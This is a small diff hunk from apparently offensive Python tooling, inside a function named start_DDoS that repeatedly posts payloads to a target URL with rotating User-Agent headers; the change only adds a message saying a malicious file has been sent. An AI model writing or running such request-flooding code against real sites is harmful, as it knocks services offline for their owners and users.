@@ -84,6 +84,7 @@ def start_DDoS(url):
 
                 headers = {'User-Agent': random.choice(headers_list)}
                 requests.post(url, headers=headers, params=payloads)
+                print("[!] Malicious file has been sent!")
     except requests.exceptions.ConnectionError:
         pass
 
